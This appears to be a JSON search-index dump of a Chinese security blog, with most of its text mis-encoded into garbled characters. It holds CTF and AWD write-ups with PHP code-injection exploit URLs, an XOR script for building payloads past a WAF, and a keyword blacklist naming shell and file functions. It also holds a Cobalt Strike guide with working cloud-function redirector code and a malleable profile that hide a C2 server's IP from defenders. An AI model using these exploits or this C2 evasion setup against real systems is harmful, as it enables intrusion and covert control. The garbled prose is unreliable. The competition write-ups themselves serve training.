{"meta":{"title":"Polo's Blog","subtitle":null,"description":null,"author":"Polo","url":"https://polosec.github.io","root":"/"},"pages":[{"title":"å…³äºæˆ‘","date":"2020-03-06T03:42:37.000Z","updated":"2021-01-26T10:01:42.200Z","comments":true,"path":"about/index.html","permalink":"https://polosec.github.io/about/index.html","excerpt":"","text":"ab4o/poloç ”ç©¶å…´è¶£ï¼šçº¢è“å¯¹æŠ—/å†…ç½‘æ¸—é€/ctf-web/æµé‡åˆ†æ/å–è¯ä¸“ä¸šï¼šç½‘ç»œç©ºé—´å®‰å…¨"},{"title":"archives","date":"2020-03-06T03:42:54.000Z","updated":"2020-03-06T11:44:30.532Z","comments":true,"path":"archives/index.html","permalink":"https://polosec.github.io/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-03-06T03:42:46.000Z","updated":"2020-03-06T11:43:55.552Z","comments":true,"path":"categories/index.html","permalink":"https://polosec.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-03-06T03:40:43.000Z","updated":"2020-03-06T11:43:14.432Z","comments":true,"path":"tags/index.html","permalink":"https://polosec.github.io/tags/index.html","excerpt":"","text":""},{"title":"Search","date":"2021-04-23T15:53:40.000Z","updated":"2021-04-23T15:55:37.878Z","comments":true,"path":"search/index.html","permalink":"https://polosec.github.io/search/index.html","excerpt":"","text":""}],"posts":[{"title":"å¹¿ä¸œçœå¼ºç½‘æ¯è¿ç»´èµ›éƒ¨åˆ†WP","slug":"å¹¿ä¸œçœå¼ºç½‘æ¯è¿ç»´èµ›éƒ¨åˆ†WP","date":"2021-11-15T12:45:56.000Z","updated":"2021-11-15T13:41:41.374Z","comments":true,"path":"2021/11/15/å¹¿ä¸œçœå¼ºç½‘æ¯è¿ç»´èµ›éƒ¨åˆ†WP/","link":"","permalink":"https://polosec.github.io/2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/","excerpt":"","text":"ä¸Šå‘¨æœ«æ‰“äº†å¼ºç½‘æ¯ï¼ŒæŸèµ›é“æ‰“äº†ç¬¬ä¸‰åæ‹¿äº†äºŒç­‰å¥–ï¼Œä¸Šåˆæ˜¯è¿ç»´èµ›ï¼Œä¸‹åˆæ˜¯awdã€‚ä¸Šåˆçš„è¿ç»´èµ›å‡ºçš„è¿˜å¯ä»¥ï¼Œæˆ‘è§‰å¾—éš¾åº¦ç›¸å¯¹ä½ä¸€ç‚¹ï¼Œä¸€å…±12é“é¢˜ï¼Œåˆ°æœ€ååŸºæœ¬æœ‰ä¸€åŠçš„äººèƒ½åšå‡ºæ¥6-8é“å·¦å³ï¼Œæœ¬èµ›é“ç¬¬ä¸‰-å…«åå…¨éƒ¨æ˜¯8é“é¢˜ã€‚è¿™æ¬¡æ‹¿å¥–å¾—äºäº†æœ‰pwnğŸ‘´å»ä¿®é¢˜ï¼Œæˆ‘webåº”æ€¥å“åº”åšçš„ä¸å¦‚åˆ«äººå¤šã€‚ åæ§½ï¼šä¸‹åˆçš„AWDçº¯è„‘ç˜«ï¼Œå‚èµ›æ‰‹å†Œå†™çš„æ˜¯AWDPï¼Œèµ›åˆ¶ä»‹ç»åˆ™æ˜¯AWDã€‚ä¸ä¸€è‡´ä¹Ÿå°±ç®—äº†ï¼Œä¸‹åˆAWDåªç»™ä¸€é“å·¨éš¾çš„pwnæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿæœ€åæ”¾hintè¿expéƒ½å¿«æ”¾å®Œäº†ï¼Œæœ€ååªæœ‰é«˜æ ¡ç»„æœ‰1-2æ”¯é˜Ÿä¼åœ¨æ‰“ï¼Œå…¶ä»–èµ›é“å…¨åœ¨ç½šåã€‚ webè¿ç»´ååºåˆ—åŒ–æœ‰ä¸€ä¸ªå­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„é¡µé¢ï¼Œå¤§ä½“æ„æ€å°±æ˜¯ä¼ å…¥å‚æ•°ä¹‹åååºåˆ—åŒ–è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œé¢˜ç›®æœ¬èº«ç»™äº†wafï¼Œåªä¸è¿‡å…³é”®è¯æ¯”è¾ƒå°‘ã€‚å¦‚ blacklist=â€™\\php|flag|system|&#39;;è‡ªå·±åŠ ä¸€äº›å…³é”®å­—å°±å¥½äº† 12345678$pattern = &quot;\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|file_get_contents|fwrite|curl|system|eval|shell_exec|cat|tac|more|flag|base64|assert|passthru|readfile|php\\:\\/\\/|file\\:\\/\\/|fread|create\\_function|php|script|\\&lt;\\?php|\\&#x27;|\\&quot;|\\(|\\)|\\&amp;&quot;;$back_list = explode(&quot;|&quot;,$pattern);foreach($back_list as $hack) &#123; if(preg_match(&quot;/$hack/i&quot;, $query)) // å‡è®¾ç”¨æˆ·è¾“å…¥çš„å‚æ•°æ˜¯ $query die(&quot;hack detected!&quot;);&#125; å¤šåŠ äº†å‡ ä¸ªå…³é”®å­—è¿™é¢˜çš„checkå°±è¿‡äº† ä¸æ­»é©¬ ls -all çœ‹äº†ä¸€ä¸‹æœ‰.2.phpï¼Œæˆ‘ç›´æ¥ rm -rf åˆ å®Œä¹‹åè¿™ä¸ªcheckç‚¹è¿˜æ˜¯æ²¡æœ‰è¿‡ï¼Œä¹‹ååˆllçœ‹äº†ä¸‹å‘ç°æ˜¯ä¸æ­»é©¬ã€‚ æ€ä¸æ­»é©¬æœ‰2ç§æ€è·¯ï¼Œç¬¬ä¸€ç§æ˜¯å†™è„šæœ¬æ— é™å¾ªç¯åˆ é™¤ï¼Œpythonæˆ–è€…shellæˆ–è€…phpè„šæœ¬éƒ½å¯ä»¥ï¼Œç¬¬äºŒç§æ˜¯é‡å¯php-fpmæœåŠ¡ã€‚è¿™æ¬¡ç»™çš„æƒé™æ¯”è¾ƒé«˜ï¼Œæ˜¯rootï¼Œå¯ä»¥ç›´æ¥é‡å¯ã€‚ä½†æ˜¯åœ¨å¤§éƒ¨åˆ†awdæ¯”èµ›ä¸­å¯èƒ½æ²¡æœ‰é‡å¯æœåŠ¡çš„æƒé™ï¼Œæ‰€ä»¥ç¬¬ä¸€ç§æ€è·¯æ˜¯å¿…è¡Œçš„ã€‚ é™„è„šæœ¬ 12345 while :do rm -rf .3.php; echo &quot;remove success&quot;;doneä¸Šä¼ ä¸Šå»ä¹‹åchmod u+x 1.sh ç„¶å nohup ./1.sh &amp;æŒ‚ç€è·‘å°±å¯ä»¥äº†ã€‚ phpinfoä¿¡æ¯æ³„éœ²æ²¡å•¥å¥½è¯´çš„ï¼Œåˆ äº†å°±è¡Œã€‚ åé—¨æŠŠæºç æä¸‹æ¥æ”¾åˆ°Dç›¾æŸ¥æ€ï¼ŒæŸ¥åˆ°äº†åé—¨ï¼Œç›´æ¥åˆ æ‰å°±å¥½ï¼Œè¿˜æœ‰XXEï¼Œæ–‡ä»¶ä¹Ÿæ˜¯ç›´æ¥åˆ æ‰å°±å¥½ã€‚ åº”æ€¥å“åº”æŒ–çŸ¿webå°±é‚£ä¹ˆå‡ é“é¢˜æˆ‘æ˜¯å¦¹æƒ³åˆ°çš„ï¼Œæˆ‘ä»¥ä¸ºåé¢è¿˜ä¼šæ”¾é¢˜ï¼Œä¸“é—¨é—®äº†ä¸»åŠæ–¹ï¼Œä¸»åŠæ–¹è¯´ä¸€æ¬¡æ”¾å®Œï¼Œå¥½å§ï¼Œé‚£ä¼°è®¡æ˜¯è¦åœ¨å…¶ä»–åœ°æ–¹æ‰¾patchç‚¹äº†ã€‚topçœ‹äº†ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªè¿›ç¨‹çš„cpuåˆ©ç”¨ç‡è¿‡é«˜ï¼Œåœ¨/home/ctf/mxxxç›®å½•ä¸‹ï¼ˆå…·ä½“ç›®å½•åç§°è®°ä¸æ¸…äº†ï¼‰æ˜¯ä¸€ä¸ªelfæ–‡ä»¶ï¼ŒåŒç›®å½•ä¸‹è¿˜æœ‰jsonçš„é…ç½®æ–‡ä»¶ï¼Œç›´è§‰å‘Šè¯‰æˆ‘æ˜¯æŒ–çŸ¿ã€‚æŒ–çŸ¿ç¨‹åºå¸¸åœ¨tmpç›®å½•å†™ç‚¹ä¸œè¥¿ï¼Œè¿™é‡Œçš„æ“ä½œå°±æ˜¯é¦–å…ˆå¹²æ‰æŒ–çŸ¿è¿›ç¨‹ï¼Œç„¶ååˆ æ‰æŒ–çŸ¿ç¨‹åºä»¥åŠtmpç›®å½•ä¸‹å¯¹åº”çš„å†…å®¹ï¼Œç„¶åæŸ¥çœ‹crontabé˜²æ­¢å†æ¬¡ä¸‹è½½ä¸è‡ªå¯åŠ¨ã€‚ crontabcrontabè¿™é¢˜æˆ‘åº”è¯¥æ˜¯å¦¹åšå‡ºæ¥ï¼Œå¼‚å¸¸ç‚¹æ˜¯ctfç”¨æˆ·çš„crontabï¼Œæˆ‘æ˜¯rootç”¨æˆ·ã€‚çœ‹äº† /var/spool/cron/crontabsæ²¡çœ‹åˆ°å•¥ä¸œè¥¿,å°±æ²¡åœ¨çœ‹ã€‚èµ›åå¸ˆå‚…è¯´äº†ä¸‹ crontab -user -l ä¹Ÿå¯ä»¥çœ‹æŒ‡å®šç”¨æˆ·çš„crontabã€‚ã€‚å­¦åˆ°äº† å¤–è¿socketnetstat -antlp ä¹‹åå‘ç°æœ‰å‘9999ç«¯å£å¤–è¿çš„è¡Œä¸ºï¼Œç„¶åps aux å’Œps ef ä¹‹åçœ‹åˆ°äº†å‘½ä»¤ç±»ä¼¼ sh -c python3 -c â€œ__import__(â€˜osâ€™).system(â€˜xxxxxxâ€™)â€ã€‚å¯ä»¥ç¡®å®šæ˜¯è¿™äº›è¿›ç¨‹å»ºç«‹äº†socketè¿æ¥ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°å…·ä½“æ˜¯è°èµ·äº†è¿™äº›è¿›ç¨‹â€¦å°±å¾ˆæ— å¥ˆï¼Œæ€ä¹Ÿæ€ä¸æ‰ï¼Œè¿™é‡Œæˆ‘çš„å¤„ç†æ–¹æ³•æ˜¯æŠŠpython3çš„è½¯è¿æ¥ç»™å¹²æ‰äº†ã€‚å› ä¸ºé€šè¿‡è§‚å¯Ÿè¿›ç¨‹å‘ç°é™¤äº†è¿™äº›å¤–è¿çš„æ²¡æœ‰ç”¨py3èµ·çš„è¿›ç¨‹ã€‚è¿™é‡Œå…¶å®æ˜¯æœ‰ä¸ªsoæ–‡ä»¶è¢«ä¿®æ”¹äº†ï¼Œåé¢pwnçš„é˜Ÿå‹ä¿®å¤çš„ã€‚ sshå…¬é’¥ssh å…å¯†ç™»å½•å­˜æ”¾çš„å…¬é’¥åœ¨~/.ssh/authorized_keysæ–‡ä»¶é‡Œé¢ï¼Œç”±äºæˆ‘ä»¬æ˜¯ç§é’¥ç™»å½•ï¼Œä½†æ˜¯é‡Œé¢æœ‰ä¸‰ä¸ªå…¬é’¥ï¼Œæˆ‘ä»¬åªä¿ç•™äº†æˆ‘ä»¬ç§é’¥å¯¹åº”çš„å…¬é’¥ï¼Œå…¶ä»–å…¬é’¥å…¨ç»™åˆ äº†ã€‚ æ€»ç»“è¿™æ¬¡è¿ç»´èµ›ç›¸å¯¹åŸºç¡€ï¼Œå°±å½“æ¸©ä¹ ä¸€ä¸‹åº”æ€¥å“åº”äº†ã€‚æ¯•ç«Ÿåªæ­£ç»åšè¿‡ä¸€æ¬¡ï¼šï¼‰","categories":[],"tags":[],"author":"Polo"},{"title":"ä¸¤é“ç®€å•ctf-php-webé¢˜","slug":"ä¸¤é“ç®€å•ctf-webé¢˜","date":"2021-11-05T16:26:30.000Z","updated":"2021-11-05T16:32:23.106Z","comments":true,"path":"2021/11/06/ä¸¤é“ç®€å•ctf-webé¢˜/","link":"","permalink":"https://polosec.github.io/2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334&lt;?phphighlight_file(&#x27;index.php&#x27;);extract($_GET);error_reporting(0);function String2Array($data)&#123; if($data == &#x27;&#x27;) return array(); @eval(&quot;\\$array = $data;&quot;); return $array;&#125;if(is_array($attrid) &amp;&amp; is_array($attrvalue))&#123; $attrstr .= &#x27;array(&#x27;; $attrids = count($attrid); for($i=0; $i&lt;$attrids; $i++) &#123; $attrstr .= &#x27;&quot;&#x27;.intval($attrid[$i]).&#x27;&quot;=&gt;&#x27;.&#x27;&quot;&#x27;.$attrvalue[$i].&#x27;&quot;&#x27;; if($i &lt; $attrids-1) &#123; $attrstr .= &#x27;,&#x27;; &#125; &#125; $attrstr .= &#x27;);&#x27;;&#125;String2Array($attrstr);â€‹```æ³¨æ„ç‚¹ï¼šextractå¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ï¼Œevalé‚£å¥è¯æ˜¯æŠŠå­—ç¬¦ä¸²æ•°ç»„æ ¼å¼è½¬ä¸ºçœŸæ­£çš„æ•°ç»„ã€‚exp: http://127.0.0.1/test.io/index.php?attrvalue[0]=2%22);system(%27whoami%27);//&amp;attrid[0]=1http://127.0.0.1/test.io/index.php?attrvalue[0]=1&amp;attrid[0]=2&amp;attrstr=phpinfo(); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&#96;&#96;&#96;php&lt;?phperror_reporting(&#39;0&#39;);$str1 &#x3D; $_GET[&#39;str1&#39;];$str2 &#x3D; $_GET[&#39;str2&#39;];function waf($str)&#123; $blacklist&#x3D;&#39;&#x2F;phpinfo|passthru&#x2F;i&#39;; if (preg_match($blacklist,$str)) &#123; return false; &#125; return true;&#125;function HackMe($str1,$str2)&#123;$str &#x3D; &quot;&quot;;for ($i &#x3D; 0;$i&lt;strlen($str1);$i++)&#123;$array1[$i] &#x3D; $str1[$i];&#125;for ($b &#x3D; 0;$b&lt;strlen($str2);$b++)&#123;$array2[$b] &#x3D; $str2[$b];&#125;for ($c&#x3D;0;$c &lt;count($array1);$c++)&#123;$str &#x3D; $str.($array1[$c] ^ $array2[$c]);&#125;if (strlen($str)&lt;&#x3D;30)&#123;if (waf($str))&#123;echo $str;eval($str);&#125;else&#123;echo &quot;ohhhhhhhhhhhhhhhhhhhhhhhh you can&#39;t get flag!!!!&quot;;&#125;&#125;else&#123;echo &quot;nonono you are sooooooooo lang~&quot;;&#125;&#125;HackMe($str1,$str2);?&gt; é¢˜ç›®å¤ç°æ—¶æ²¡æœ‰waf.phpï¼Œåœ¨æ¯”èµ›çš„æ—¶å€™éœ€è¦å»fuzzä¸‹è¿‡æ»¤äº†å“ªä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œç®€å•å†™äº†äº›wafçš„å®ç°ï¼Œç›´æ¥å†™åˆ°functioné‡Œé¢äº†ã€‚ç®€å•çš„å¼‚æˆ–ï¼Œè„šæœ¬å¦‚ä¸‹ 123456789101112131415161718192021222324ava_alpha=[]for i in range(0,128): if(32&lt;i and i&lt;127): ava_alpha.append(chr(i))target_str=&quot;system(&#x27;whoami&#x27;);&quot;res1=&quot;&quot;res2=&quot;&quot;blacklist=[&#x27;!&#x27;]class Getoutofloop(Exception): passfor k in range (len(target_str)): try: for i in ava_alpha: for j in ava_alpha: if(chr(ord(i)^ord(j))==(target_str[k]) and i not in blacklist and j not in blacklist): res1+=str(i) res2+=str(j) raise Getoutofloop() except: passprint(res1)print(res2) æ¯”è¾ƒç®€å•çš„å¼‚æˆ–ï¼Œå†™è„šæœ¬çš„æ—¶å€™æ³¨æ„å¦‚ä½•è·³å‡ºæ‰€æœ‰å¾ªç¯ï¼Œè¿™é‡Œç”¨åˆ°äº†raise exceptionï¼Œå¯ä»¥æ ¹æ®é»‘åå•ç»´æŠ¤blacklistä¿è¯ä¸ç”¨blacklisté‡Œé¢çš„å­—ç¬¦ç”Ÿæˆå¼‚æˆ–å­—ç¬¦ã€‚","categories":[],"tags":[],"author":"Polo"},{"title":"CobaltStrike äº‘å‡½æ•°éšè—æœåŠ¡å™¨IP","slug":"CobaltStrike-äº‘å‡½æ•°éšè—æœåŠ¡å™¨IP","date":"2021-10-15T09:46:15.000Z","updated":"2021-10-15T11:14:32.431Z","comments":true,"path":"2021/10/15/CobaltStrike-äº‘å‡½æ•°éšè—æœåŠ¡å™¨IP/","link":"","permalink":"https://polosec.github.io/2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/","excerpt":"","text":"å‚è€ƒé“¾æ¥https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q https://blog.zsec.uk/cobalt-strike-profiles/ å‰è¨€åœ¨çº¢é˜ŸåŸºç¡€è®¾æ–½å»ºè®¾ä¸­ï¼Œä½¿ç”¨äº‘å‡½æ•°å¯éšè—çœŸå®C2çš„IPåœ°å€ï¼Œå½“ç„¶ï¼Œè¿™åªæ˜¯å…¶ä¸­ä¸€ç§æ–¹æ³•ï¼Œå…¶ä»–æ–¹æ³•åŒ…æ‹¬ä½†ä¸é™äºç‰¹å¾æ¶ˆé™¤ã€è¯ä¹¦ä¿®æ”¹ã€CDNã€åŸŸå‰ç½®ã€‚è¿™äº›æŠ€æœ¯ä¼šé™†ç»­å®ç°ã€‚ å‡†å¤‡å·¥ä½œè…¾è®¯äº‘æ³¨å†Œäº‘å‡½æ•° æ–°å»ºå‡½æ•°-è‡ªå®šä¹‰åˆ›å»ºå‡½æ•° Pythonæ¨¡æ¿ï¼Œpython3.6å³å¯ï¼Œè§¦å‘æ–¹å¼é€‰æ‹©APIç½‘å…³è§¦å‘ åœ¨å‡½æ•°ä»£ç ä¸­å†™å…¥å¦‚ä¸‹ä»£ç  123456789101112131415161718192021# -*- coding: utf8 -*-import json,requests,base64def main_handler(event, context): C2=&#x27;http://&#x27; # C2 IPåœ°å€ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ HTTPã€HTTPS~ä¸‹è§’æ ‡~ path=event[&#x27;path&#x27;] headers=event[&#x27;headers&#x27;] print(event) if event[&#x27;httpMethod&#x27;] == &#x27;GET&#x27; : resp=requests.get(C2+path,headers=headers,verify=False) else: resp=requests.post(C2+path,data=event[&#x27;body&#x27;],headers=headers,verify=False) print(resp.headers) print(resp.content) response=&#123; &quot;isBase64Encoded&quot;: True, &quot;statusCode&quot;: resp.status_code, &quot;headers&quot;: dict(resp.headers), &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1] &#125; return response æ¥ä¸‹æ¥é…ç½®APIç½‘å…³ ç‰ˆæœ¬é€‰æ‹©LATESTï¼Œç‚¹è¿›å»è“è‰²çš„é“¾æ¥è¿›è¡ŒAPIé…ç½®ï¼Œè·¯å¾„æ”¹ä¸ºæ ¹ç›®å½• ç„¶åä¸‹ä¸€æ­¥ï¼Œäº‹ä»¶å‡½æ•°ï¼Œç‰ˆæœ¬é€‰æ‹©LATESTï¼Œä¸€å®šè¦å‹¾é€‰å“åº”é›†æˆã€‚ä¹‹åç‚¹ç«‹å³å®Œæˆå°±å¯ä»¥äº†ã€‚ å‘å¸ƒæœåŠ¡ä¹‹ååœ¨å³è¾¹å¯ä»¥çœ‹åˆ°APIçš„HTTPä¸HTTPSåœ°å€ï¼Œè®°ä½è¿™ä¸ªæœ‰ç”¨ï¼Œå½“ç„¶äº†ï¼Œåœ¨äº‘å‡½æ•°é‚£ä¹Ÿå¯ä»¥çœ‹ï¼ˆå‡½æ•°æœåŠ¡-è§¦å‘ç®¡ç†-è®¿é—®è·¯å¾„ï¼‰ cobalt strikeé…ç½®CSçš„é…ç½®è¸©å¤§å‘ã€‚ é¦–å…ˆæ˜¯ç¼–å†™å¯¹åº”çš„profileï¼Œä»£ç å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859set sample_name &quot;t&quot;;set sleeptime &quot;3000&quot;;set jitter &quot;0&quot;;set maxdns &quot;255&quot;;set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;http-get &#123; set uri &quot;/api/x&quot;; client &#123; header &quot;Accept&quot; &quot;*/*&quot;; metadata &#123; base64; prepend &quot;SESSIONID=&quot;; header &quot;Cookie&quot;; &#125; &#125; server &#123; header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;; header &quot;content-transfer-encoding&quot; &quot;binary&quot;; header &quot;Server&quot; &quot;Nodejs&quot;; output &#123; base64; print; &#125; &#125;&#125;http-stager &#123; set uri_x86 &quot;/vue.min.js&quot;; set uri_x64 &quot;/bootstrap-2.min.js&quot;;&#125;http-post &#123; set uri &quot;/api/y&quot;; client &#123; header &quot;Accept&quot; &quot;*/*&quot;; id &#123; base64; prepend &quot;JSESSION=&quot;; header &quot;Cookie&quot;; &#125; output &#123; base64; print; &#125; &#125; server &#123; header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;; header &quot;content-transfer-encoding&quot; &quot;binary&quot;; header &quot;Connection&quot; &quot;keep-alive&quot;; output &#123; base64; print; &#125; &#125;&#125; ç¼–å†™å®Œä¹‹åå‘½åä¸ºc2.profileï¼Œç„¶åç”¨csç›®å½•ä¸‹çš„c2lint.shè¿›è¡Œæ£€æŸ¥ï¼Œè¿™ä¸ªä¸œè¥¿çš„ä½œç”¨å°±æ˜¯æ£€æŸ¥ç¼–å†™çš„profileæ˜¯å¦æ­£ç¡®ã€‚ c2lint.sh ./c2.profile è¿™æ ·çœ‹æ˜¯æ²¡å•¥é—®é¢˜ï¼Œç„¶åè¿è¡Œteamserverçš„æ—¶å€™åé¢è·Ÿä¸Šprofileå°±å¯ä»¥äº†ï¼Œä¾‹å¦‚ ./teamserver.sh 1.1.1.1 123456 c2.profile è¿™æ ·å°±å¯ä»¥æŠŠprofileä½œä¸ºlistenerçš„é…ç½®ã€‚ å¯åŠ¨csåï¼Œæ·»åŠ http listenerï¼ŒHOSTSå’ŒSTAGERå¡«å†™å¦‚ä¸‹ éƒ½æ˜¯ç”Ÿæˆçš„äº‘å‡½æ•°çš„åœ°å€ï¼Œæ³¨æ„æŠŠå‰é¢çš„HTTPï¼š//å»æ‰ï¼ï¼ ä¿å­˜åï¼Œç”ŸæˆEXEï¼Œä¸Šçº¿ã€‚ ç„¶ååœ¨victimä¸»æœºä¸ŠæŸ¥çœ‹æµé‡ï¼Œå¹¶æ²¡æœ‰å‘ç°C2çš„IPåœ°å€,140å¼€å¤´çš„åœ°å€ä¸æ˜¯æˆ‘çš„åœ°å€ã€‚ è¿™æ ·å°±ä½¿ç”¨äº‘å‡½æ•°å®ç°äº†C2çœŸå®IPçš„éšè—ï¼Œåœ¨CSä¸­ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨å‘½ä»¤ï¼Œè¯æ˜beaconå·¥ä½œæ— å¼‚å¸¸ã€‚","categories":[],"tags":[{"name":"çº¢é˜ŸæŠ€èƒ½","slug":"çº¢é˜ŸæŠ€èƒ½","permalink":"https://polosec.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"}]},{"title":"ç»¿åŸæ¯AWDæ€»ç»“","slug":"ç»¿åŸæ¯AWDæ€»ç»“","date":"2021-10-14T17:07:20.000Z","updated":"2021-10-14T17:13:11.947Z","comments":true,"path":"2021/10/15/ç»¿åŸæ¯AWDæ€»ç»“/","link":"","permalink":"https://polosec.github.io/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/","excerpt":"","text":"å‰è¨€è¿™æ¬¡æ‰“ç»¿åŸæ¯ä»£ä»·æŒºå¤§çš„ï¼Œæ”¹ç­¾æœºç¥¨æå‰ä½äº†ä¸€æ™šå®¾é¦†ï¼Œåœ¨é«˜é“ç«™æ‰“äº†ä¸€å¤©åˆèµ›ï¼›è¿›äº†çº¿ä¸‹å­¦æ ¡ä¸æŠ¥é”€è·¯è´¹ï¼Œæ¥å›å¹³å‡ä¸€ä¸ªäºº1500å—ï¼Œä¸€å…±å»äº†å››ä¸ªäººã€‚æœ€åçš„ç»“æœæ˜¯ä¸ŠåˆCTFä¸€åˆ†æ²¡æ‹¿ï¼Œä¸‹åˆAWDæ‰“åˆ°äº†ç¬¬ä¹åï¼Œæ€»ä½“æ’åè¿˜æ˜¯æ²¡æœ‰æ’åˆ°å‰9ï¼Œåªç»™äº†ä¼˜èƒœå¥–ã€‚æ’‡å»è‡ªèº«å®åŠ›åŸå› å¤–ï¼Œæˆ‘æƒ³åæ§½ç»„å§”ä¼šï¼šä¸ºä»€ä¹ˆæœ¬æ¥è¯´åªæœ‰AWDç»“æœä¸Šåˆæ‰“CTF?è¯´æ˜¯CTF/AWDåˆ†å€¼ä¸€æ¯”ä¸€ï¼Œæ˜¯å¦ä¸¥æ ¼å±¥è¡Œï¼Ÿä½ çº¿ä¸‹AWDæä¸ªCTFæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿé˜²æ­¢PYä¸Šåˆä¸ç¦æ­¢å»å•æ‰€ï¼Œä¸‹åˆAWDå´ç¦æ­¢å»å•æ‰€ï¼Œè°AWDè¿˜æœ‰ç©ºå»PYï¼Ÿæ¶ˆæ¯é€šçŸ¥æ··ä¹±ï¼Œåˆ°äº†éƒ‘å·æ‰çŸ¥é“è¦åšæ ¸é…¸ï¼Œè·å¥–é˜Ÿä¼å°‘ï¼Œå¥–é‡‘å°‘ï¼Œæ— ç°é‡‘ï¼Œåªæœ‰Eå¡ã€‚æˆ‘æ„¿ç§°ä¹‹ä¸ºå…¨å›½æœ€ç©·å›½å®¶ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨æ´»åŠ¨ã€‚ä¸‹é¢è¯´æˆ‘åœ¨æ¯”èµ›ä¸­è¿”çš„ä¸€äº›é”™è¯¯ã€‚ä¸ŠåˆCTFï¼Œæœ¬äººèœï¼Œæ²¡å•¥å¥½è¯´çš„ã€‚ è‡´å‘½AWDæµç¨‹ç¯èŠ‚å‡ºç°ä¸¥é‡é—®é¢˜ã€‚èµ›å‰æ¼”ç»ƒå››ä¸ªäººçš„é…åˆä¸­éƒ½æ²¡æœ‰æ¼”ç»ƒåˆ°æ–‡ä»¶ç›‘æ§è„šæœ¬çš„ä½¿ç”¨ï¼Œå¯¼è‡´è¢«åˆ«äººç§äº†ä¸æ­»é©¬æ‰å¤§åˆ†ã€‚åœ¨ç›‘æ§ä¸åˆ°æµé‡ã€pwné¢˜ä¸‹çº¿ã€webä¸€ç›´è¢«æ‰“çš„æƒ…å†µä¸‹å½“æ—¶æ²¡æœ‰æƒ³åˆ°ä¸æ­»é©¬è¿™ä¸ªäº‹æƒ…ï¼Œæ˜¯æˆ‘ç–å¿½äº†ã€‚ä¸Šäº†æ–‡ä»¶ç›‘æ§è„šæœ¬åå†ä¹Ÿæ²¡å¤±åˆ†ã€‚ï¼ˆè‡ªåŠ¨åˆ é™¤ä¸æ­»é©¬åŠä»»ä½•æ–°ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ— crontabï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¯”èµ›çš„æ—¶å€™æˆ‘å¿˜è®°crontabè·¯å¾„äº†ï¼Œåªèƒ½çœ‹å½“å‰userï¼Œä½†shellçš„æƒé™å¤§éƒ¨åˆ†æ˜¯www-dataéœ€è¦åŠ å¼ºè®°å¿†ï¼‰ ä¸¥é‡è„šæœ¬ç¼–å†™èƒ½åŠ›è¿‡å·®ã€‚å½“é˜Ÿå‹é€šè¿‡æµé‡æŠ“å–åˆ°æ¼æ´åˆ©ç”¨æ–¹å¼æ—¶ï¼Œç»æˆ‘éªŒè¯ååº”è¯¥è¿…é€Ÿå†™å‡ºæ‰¹é‡åˆ©ç”¨è„šæœ¬ï¼Œåœ¨è¿™ä¸ªåœ°æ–¹å¡ä½äº†ï¼Œå¯¼è‡´å†™è„šæœ¬å†™çš„æ¯”è¾ƒæ…¢ï¼Œåº”è¯¥æ˜¯ä¸¢æ‰äº†è®¸å¤šåˆ†æ•°ã€‚ æ— æ³•è‡ªåŠ¨æäº¤flagã€‚å®‰æ’çš„HTTPSæµé‡ä¸çŸ¥é“ä¸ºå•¥æŠ“ä¸åˆ°ï¼Œæ²¡æœ‰åŠæ³•ç”¨è„šæœ¬è‡ªåŠ¨æäº¤flagã€‚ æ— æ³•è¿›ä¸€æ­¥åˆ©ç”¨å·²çŸ¥æ¼æ´ç§æ¤ä¸æ­»é©¬ã€‚è¿™å¯¼è‡´ä¸¢äº†å¾ˆå¤šåˆ†æ•° èµ›æ—¶è„šæœ¬ç»“æ„æ··ä¹±ï¼Œåº”å°†åŠŸèƒ½ç‚¹åˆ†å¼€ï¼ŒRCEåˆ©ç”¨å’Œç§é©¬åº”åŒæ—¶å°è¯•è¿›è¡Œï¼Œåˆ©ç”¨é©¬getflagçš„æ“ä½œåº”è¯¥åœ¨å¦ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚å¤šçº¿ç¨‹å°šæœªç†Ÿç»ƒæŒæ¡ AOIAWDèµ›å‰æœªæˆåŠŸéƒ¨ç½²ï¼Œä»…é watchbirdæ€»æ˜¯æ„Ÿè§‰åŠ›ä¸ä»å¿ƒã€‚ è½»å¾®èµ›æ—¶ç´§å¼ ï¼Œå¯¹å¾…é˜Ÿå‹çš„æ€åº¦æœ‰æ—¶è¿‡æ¿€ã€‚ 